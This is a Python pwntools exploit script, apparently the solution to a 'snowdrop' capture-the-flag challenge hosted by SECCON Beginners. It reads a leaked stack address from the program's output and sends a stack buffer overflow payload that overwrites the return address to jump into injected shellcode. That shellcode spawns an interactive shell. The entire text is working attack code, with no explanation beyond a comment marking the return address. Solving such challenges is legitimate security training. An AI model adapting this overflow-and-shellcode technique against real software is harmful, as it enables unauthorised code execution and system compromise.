from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './chall'
e = context.binary = ELF(filepath, checksec=False)
if args.REMOTE:
    # p = remote('localhost', 7777)
    p = remote('snowdrop.quals.beginners.seccon.jp', 9002)
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

offset = 0x7fffffffdd88 - 0x7fffffffdb40
p.recvuntil(b'000006 | ')
leak = int(p.recvline()[:-1], 16) - offset 
log.info(hex(leak))
payload = b'A' * 0x18
payload += p64(leak)    # ret addr
payload += asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
